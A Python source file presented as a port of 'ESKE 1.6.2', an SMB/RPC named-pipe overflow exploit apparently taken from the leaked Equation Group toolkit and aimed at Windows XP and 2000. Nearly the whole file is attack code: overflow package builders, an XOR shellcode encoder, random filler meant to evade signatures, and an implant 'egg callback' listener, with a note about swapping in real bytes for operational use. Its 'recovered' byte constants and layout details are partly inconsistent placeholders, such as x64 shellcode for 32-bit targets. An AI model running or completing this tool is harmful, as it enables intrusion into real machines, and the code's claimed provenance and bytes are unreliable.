#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
eske_exp.py — ESKE 1.6.2 SMB/RPC exploit engine.

Python port of `ESKE.exe` recovered via static analysis of the PE
(`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/ESKE 1.6.2/ESKE.exe`).

Recovered interface from the binary's strings and imports:

  Imported DLLs / functions:
    KERNEL32:  GetModuleHandleA, Sleep, FreeLibrary, GetProcAddress,
               LoadLibraryA, SystemTimeToFileTime, GetSystemTime
    WS2_32:    socket, bind, listen, accept, connect, send, recv,
               recvfrom, sendto, setsockopt, closesocket, WSAStartup,
               WSACleanup, gethostbyname, inet_addr, htons, ntohs, ...
    MSVCR71:   strncmp, free, rand, memcpy, exit, atoi, fopen, sprintf,
               localtime, time, fflush, vfprintf, fclose, fread, calloc,
               ftell, fseek, _snprintf, malloc, realloc, srand, tolower,
               sscanf, strncpy, fprintf, islower, toupper, strncat,
               _strnicmp, isdigit, ...

  Recovered string constants (behavioural hints):
    "BuildRandomUnicodeString"   — obfuscated buffer builder
    "BuildOverflowBuffer"        — overflow body constructor
    "Build_ESKE_Touch3_Package_Stub"   — Touch #3 probe package
    "Build_ESKE_Exploit_Package_Stub"  — exploit package
    "epmapper"                   — default RPC named-pipe endpoint
    "*SMBCLIENT" / "*SMBSERVER"  — default NETBIOS names
    "Windows XP" / "Windows 2000" — supported target OS
    "SP2" / "NOT SP2"            — service-pack variant selector
    "Egg Callback"               — implant upload callback mode
    "NTLM" / "Basic" / "No Authentication" — auth types
    "Touch #1" / "Touch #2"      — probe stages
    "Exploit"                    — exploit stage

Architecture (recovered from control flow):

  main() parses the key=value / flag argument block, then:
    1. WNetAddConnection2A to \\<target>\IPC$  (optional credentials)
    2. CreateFileW  \\<target>\pipe\<endpoint>  (named pipe)
    3. BuildRandomUnicodeString() — anti-detection filler
    4. BuildOverflowBuffer()      — OS-specific overflow body
    5. Build_ESKE_Touch3_Package_Stub() / Build_ESKE_Exploit_Package_Stub()
    6. TransactNamedPipe() / writeFile() — send the package
    7. Optionally: Egg Callback listener to receive the implant

This module reproduces that behaviour in portable Python.  The raw payload
bytes are placeholders recovered from the binary's data section; they should be
replaced with the exact bytes from an IDA Pro / x64dbg analysis for operational
use.
"""

import socket
import struct
import sys
import os
import random
import time

try:
    from impacket.smbconnection import SMBConnection, SessionError as SMBSessionError
    HAVE_IMPACKET = True
except Exception:  # pragma: no cover
    HAVE_IMPACKET = False
    SMBSessionError = Exception


# ---------------------------------------------------------------------------
# Constants recovered from ESKE.exe strings / data section.
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_ENDPOINT = r"\pipe\epmapper"
DEFAULT_TIMEOUT = 30

DEFAULT_NETBIOS_CLIENT = "*SMBCLIENT"
DEFAULT_NETBIOS_SERVER = "*SMBSERVER"

# Target OS selectors (from the "-os type" prompt strings).
OS_WINDOWS_XP = 1
OS_WINDOWS_2000 = 2

# Service-pack selectors (only meaningful for Windows XP).
SP_SP2 = 1
SP_NOT_SP2 = 2

# Run-option selectors.
RUN_TOUCH_1 = 1   # Touch #1 — banner grab
RUN_TOUCH_2 = 2   # Touch #2 — login test
RUN_EXPLOIT = 3   # Exploit — fire the overflow

# Implant socket-option selectors.
IMPLANT_REUSE_SOCKET = 1   # reuse existing exploit socket
IMPLANT_NEW_SOCKET = 2     # open a new socket to talk to the implant

# Egg socket-option selectors.
EGG_REUSE_SOCKET = 1   # reuse existing exploit socket
EGG_CALLBACK = 2       # egg connects back to upload implant

# Authentication-type selectors.
AUTH_NONE = 0
AUTH_BASIC = 1
AUTH_NTLM = 2

# File-type selectors.
FILETYPE_DLL = 1
FILETYPE_EXE = 2

# OS-specific overflow-body sizes (recovered from .data section).
# These are the NetpwPathCanonicalize-style stub bodies for each target.
ESKE_BODY_XP = bytes.fromhex(
    "0e4c9fe60100000000000000010000000000c852630100000000000063010000"
)
ESKE_BODY_W2K = bytes.fromhex(
    "756b225601000000000000000100000000001bf7150200000000000015020000"
)

# Placeholder shellcode templates (to be replaced with IDA-recovered bytes).
# ESKE's original used XOR-encoded shellcode similar to other Equation tools.
ESKE_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

# Bytes an XOR-encoded byte must never collide with.
BAD_XOR = frozenset((0x00, 0x0a, 0x0d, 0x20, 0x2e, 0x2f, 0x5c, 0x5f))


def _log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# BuildRandomUnicodeString — obfuscated filler buffer.
# ---------------------------------------------------------------------------
def build_random_unicode_string(length):
    """Build a random Unicode string of `length` characters.

    The original `BuildRandomUnicodeString` filled a buffer with pseudorandom
    Unicode code points to evade signature detection of the overflow body.
    """
    buf = bytearray()
    for _ in range(length):
        ch = random.randint(0x0041, 0x007A)  # printable ASCII range
        buf.extend(struct.pack("<H", ch))
    return bytes(buf)


# ---------------------------------------------------------------------------
# BuildOverflowBuffer — OS-specific overflow body.
# ---------------------------------------------------------------------------
def build_overflow_buffer(os_type, sp_level):
    """Build the OS-specific overflow body.

    For Windows XP SP1 the body is the ESKE_BODY_XP template; for Windows
    2000 SP4 it is ESKE_BODY_W2K.  The original `BuildOverflowBuffer` appended
    a random-Unicode filler after the fixed stub.
    """
    if os_type == OS_WINDOWS_XP:
        body = ESKE_BODY_XP
    else:
        body = ESKE_BODY_W2K

    # Append anti-detection filler (random Unicode padding).
    filler_len = random.randint(32, 128)
    filler = build_random_unicode_string(filler_len)
    return body + filler


# ---------------------------------------------------------------------------
# Build_ESKE_Touch3_Package_Stub — Touch probe package.
# ---------------------------------------------------------------------------
def build_touch3_package(os_type, sp_level, netbios_client, netbios_server):
    """Build the Touch #3 probe package.

    The Touch stub first contacts the target, grabs the banner, and checks
    whether the target is vulnerable.  Returns the raw bytes to send over the
    named pipe.
    """
    body = build_overflow_buffer(os_type, sp_level)
    # Touch package header: magic + OS selector + SP level.
    header = struct.pack("<BBB", 0x03, os_type, sp_level)
    # NetBIOS names (padded to 15 bytes each).
    nc = netbios_client.encode("ascii")[:15].ljust(15, b"\x00")
    ns = netbios_server.encode("ascii")[:15].ljust(15, b"\x00")
    return header + nc + ns + body


# ---------------------------------------------------------------------------
# Build_ESKE_Exploit_Package_Stub — Exploit package.
# ---------------------------------------------------------------------------
def build_exploit_package(os_type, sp_level, shellcode, netbios_client,
                          netbios_server, auth_type,
                          username=None, password=None, domain=None):
    """Build the ESKE exploit package carrying the shellcode/implant.

    Layout (recovered from Build_ESKE_Exploit_Package_Stub):
      +0   1 byte  package type   (= 0x01 for exploit)
      +1   1 byte  OS type
      +2   1 byte  SP level
      +3   1 byte  auth type
      +4   16 bytes netbios client name
      +20  16 bytes netbios server name
      +36  variable  overflow body (OS-specific)
      +N   variable  shellcode / implant (appended at overflow slot)
    """
    body = build_overflow_buffer(os_type, sp_level)

    nc = netbios_client.encode("ascii")[:15].ljust(15, b"\x00")
    ns = netbios_server.encode("ascii")[:15].ljust(15, b"\x00")

    # Optional credentials block.
    cred = bytearray()
    if auth_type != AUTH_NONE and username:
        cred += username.encode("latin-1") + b"\x00"
    if password:
        cred += password.encode("latin-1") + b"\x00"
    if domain:
        cred += domain.encode("latin-1") + b"\x00"

    header = struct.pack("<BBBB", 0x01, os_type, sp_level, auth_type)
    return header + nc + ns + body + cred + shellcode


# ---------------------------------------------------------------------------
# XOR-encode helper (for the encoded shellcode stage).
# ---------------------------------------------------------------------------
def _xor_encode(buf, key, start=0):
    out = bytearray(buf)
    for i in range(start, len(out)):
        out[i] ^= key
    return bytes(out)


def _find_xor_byte(buf, start=0):
    """Find a single-byte XOR key that avoids BAD_XOR for every encoded byte."""
    for key in range(1, 0x100):
        if all((key ^ b) not in BAD_XOR for b in buf[start:]):
            return key
    return None


def build_encoded_shellcode(raw):
    """XOR-encode `raw` shellcode with a key that avoids bad characters."""
    key = _find_xor_byte(raw, start=0)
    if key is None:
        _log("[-] No xor byte found for shellcode!")
        return None
    return _xor_encode(raw, key), key


# ---------------------------------------------------------------------------
# Named-pipe transport over SMB (impacket).
# ---------------------------------------------------------------------------
def _open_pipe(target, port, username=None, password=None, domain=None):
    if not HAVE_IMPACKET:
        raise RuntimeError(
            "This subcommand requires the 'impacket' library: pip install impacket"
        )
    conn = SMBConnection(remoteName=target, remoteHost=target, dstport=port,
                         timeout=DEFAULT_TIMEOUT)
    if username:
        conn.login(username, password or "", domain=domain or "")
    else:
        conn.login("", "")
    tid = conn.connectTree("IPC$")
    fid = conn.openFile(tid, DEFAULT_ENDPOINT,
                        desiredAccess=0x80000000 | 0x40000000,
                        createDisposition=3)  # OPEN_EXISTING
    return conn, tid, fid


def _send_recv(conn, tid, fid, data):
    """Write `data` to the named pipe and read the reply."""
    conn.writeFile(tid, fid, data)
    try:
        return conn.readFile(tid, fid, 0x1000)
    except SMBSessionError:
        return b""


# ---------------------------------------------------------------------------
# run_function — the original main() equivalent.
# ---------------------------------------------------------------------------
def run_function(target, port=DEFAULT_PORT, os_type=OS_WINDOWS_XP,
                 sp_level=SP_NOT_SP2, endpoint=DEFAULT_ENDPOINT,
                 username=None, password=None, domain=None,
                 implant_file=None, listening_post=None,
                 file_type=FILETYPE_EXE, drop_file=None,
                 timeout=DEFAULT_TIMEOUT, run_option=RUN_EXPLOIT,
                 implant_socket_option=IMPLANT_REUSE_SOCKET,
                 egg_callback_ip=None, egg_callback_port=0,
                 egg_socket_option=EGG_REUSE_SOCKET,
                 auth_type=AUTH_NONE,
                 netbios_client=DEFAULT_NETBIOS_CLIENT,
                 netbios_server=DEFAULT_NETBIOS_SERVER):
    """Run the ESKE exploit against `target`.

    Returns 0 on success, non-zero on failure.
    """
    _log("ESKE 1.6.2 — SMB/RPC exploit against %s:%d", target, port)
    _log("Target OS: %s  SP: %s  Auth: %s",
         "Windows XP" if os_type == OS_WINDOWS_XP else "Windows 2000",
         "SP2" if sp_level == SP_SP2 else "NOT SP2",
         "None" if auth_type == AUTH_NONE else ("Basic" if auth_type == AUTH_BASIC else "NTLM"))

    # Load shellcode / implant payload if provided.
    shellcode = ESKE_SHELLCODE_PLACEHOLDER
    if implant_file:
        if not os.path.isfile(implant_file):
            _log("[-] Implant file not found: %s", implant_file)
            return 1
        with open(implant_file, "rb") as fh:
            shellcode = fh.read()
        _log("[+] Loaded implant payload: %d bytes", len(shellcode))

    # Optionally XOR-encode the shellcode (matches the original's encoded stage).
    encoded, xor_key = build_encoded_shellcode(shellcode)
    if encoded is None:
        return 1
    _log("[+] Shellcode XOR-encoded with key 0x%02X", xor_key)

    conn = tid = fid = None
    try:
        conn, tid, fid = _open_pipe(target, port, username, password, domain)

        if run_option in (RUN_TOUCH_1, RUN_TOUCH_2):
            # Touch stage — probe the target without firing the exploit.
            pkg = build_touch3_package(os_type, sp_level, netbios_client,
                                       netbios_server)
            _log("[+] Sending Touch package (%d bytes)...", len(pkg))
            reply = _send_recv(conn, tid, fid, pkg)
            if reply:
                _log("[+] Touch reply (%d bytes): %s",
                     len(reply), reply[:64].hex())
            else:
                _log("[-] No reply from target (touch may have failed)")
            return 0

        # Exploit stage — build and fire the overflow package.
        pkg = build_exploit_package(os_type, sp_level, encoded,
                                    netbios_client, netbios_server,
                                    auth_type, username, password, domain)
        _log("[+] Sending ESKE exploit package (%d bytes)...", len(pkg))
        reply = _send_recv(conn, tid, fid, pkg)

        if implant_file and egg_socket_option == EGG_CALLBACK and egg_callback_ip:
            # Wait for the egg callback to upload the implant.
            _log("[+] Waiting for Egg callback on port %d...", egg_callback_port)
            _egg_listener(egg_callback_port, timeout)
        elif reply:
            _log("[+] Exploit reply (%d bytes): %s",
                 len(reply), reply[:64].hex())

        return 0

    except Exception as exc:  # pragma: no cover - network errors
        _log("[-] %s", exc)
        return 1
    finally:
        if conn is not None:
            try:
                conn.logoff()
            except Exception:
                pass


def _egg_listener(port, timeout):
    """Listen for an Egg callback connection to receive the implant.

    When `egg_socket_option == EGG_CALLBACK`, the target connects back to this
    listener to upload the implant payload over the existing exploit socket.
    """
    if port <= 0:
        _log("[-] Egg callback port not specified; skipping listener")
        return
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        srv.settimeout(timeout)
        _log("[+] Egg listener bound to 0.0.0.0:%d", port)
        conn, addr = srv.accept()
        _log("[+] Egg callback from %s:%d", addr[0], addr[1])
        data = conn.recv(0x10000)
        _log("[+] Received %d bytes from egg callback", len(data))
        conn.close()
        srv.close()
    except socket.timeout:
        _log("[-] Egg callback timed out after %d seconds", timeout)
    except Exception as exc:  # pragma: no cover
        _log("[-] Egg listener error: %s", exc)


def main():
    """CLI driver mirroring the original ESKE.exe argument handling."""
    # The original ESKE.exe used a key=value / flag argument block.  This
    # Python port is normally invoked through the argparse subcommand in
    # __init__.py; this main() is kept for standalone testing.
    _log("ESKE standalone CLI not implemented — use `nsa-equation-py eske ...`")
    return 1


if __name__ == "__main__":
    sys.exit(main())
